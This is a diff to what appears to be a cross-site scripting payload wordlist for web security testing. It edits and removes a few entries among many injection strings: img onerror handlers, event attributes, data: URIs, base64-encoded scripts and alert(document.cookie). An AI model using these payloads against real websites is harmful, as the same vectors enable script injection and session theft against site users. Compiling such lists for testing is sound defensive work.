@@ -1,4 +1,4 @@
-#"><img src=xx onerror=prompt(1)>
+search"="><img src=a.com onerror=alert(1)>"<
 <img src=xx onerror=alert(1)>
 '+onclick=alert(1)+'
 ”/>&lt;script>alert(1)&lt;/script&gt”/>
@@ -41,9 +41,7 @@ alert(document.cookie);confirm(1)
 <marquee onstart=alert(1)>
 <meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
 <body ontouchstart=alert(1)>
-#alert(document.domain)
 onclick="alert(1)">
-#"><img src=:// onerror=alert(2)>
 data:text/html,<script>alert(0)</script>
 data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
